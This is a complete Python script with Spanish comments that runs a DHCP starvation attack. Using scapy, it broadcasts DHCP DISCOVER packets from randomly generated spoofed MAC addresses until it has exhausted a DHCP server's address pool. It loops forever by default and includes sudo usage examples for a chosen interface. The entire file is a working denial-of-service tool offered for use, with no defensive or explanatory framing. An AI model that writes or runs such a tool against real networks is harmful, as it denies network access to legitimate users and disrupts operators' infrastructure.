#!/usr/bin/env python3
"""
DHCP Starvation
Agota el pool del servidor DHCP enviando DISCOVER con MACs origen aleatorias.

Ejemplos:
    sudo python3 dhcp_starvation.py -i eth0
    sudo python3 dhcp_starvation.py -i eth0 -d 0.02 -c 500
"""
import argparse
import random
import time
from scapy.all import sendp, Ether, IP, UDP, BOOTP, DHCP

def parse_args():
    ap = argparse.ArgumentParser(description="Ataque DHCP Starvation")
    ap.add_argument("-i", "--iface", required=True, help="Interfaz de red")
    ap.add_argument("-d", "--delay", type=float, default=0.05,
                    help="Retardo entre DISCOVER en seg (def. 0.05)")
    ap.add_argument("-c", "--count", type=int, default=0,
                    help="Numero de DISCOVER (0 = infinito)")
    return ap.parse_args()

def mac_aleatoria():
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return bytes(mac), ":".join("%02x" % b for b in mac)

def main():
    args = parse_args()
    print(f"--- Iniciando DHCP Starvation por {args.iface} ---")
    print("Presiona Ctrl+C para detener el ataque.\n")

    contador = 0
    try:
        while args.count == 0 or contador < args.count:
            mac_bytes, mac_str = mac_aleatoria()
            pkt = (Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff") /
                   IP(src="0.0.0.0", dst="255.255.255.255") /
                   UDP(sport=68, dport=67) /
                   BOOTP(chaddr=mac_bytes,
                         xid=random.randint(1, 0xFFFFFFFF),
                         flags=0x8000) /
                   DHCP(options=[("message-type", "discover"), "end"]))
            sendp(pkt, iface=args.iface, verbose=False)
            contador += 1
            print(f"[+] DISCOVER #{contador} desde MAC falsa {mac_str}")
            time.sleep(args.delay)
    except KeyboardInterrupt:
        pass
    print(f"\n[!] DHCP Starvation detenido. Total: {contador} DISCOVER.")

if __name__ == "__main__":
    main()
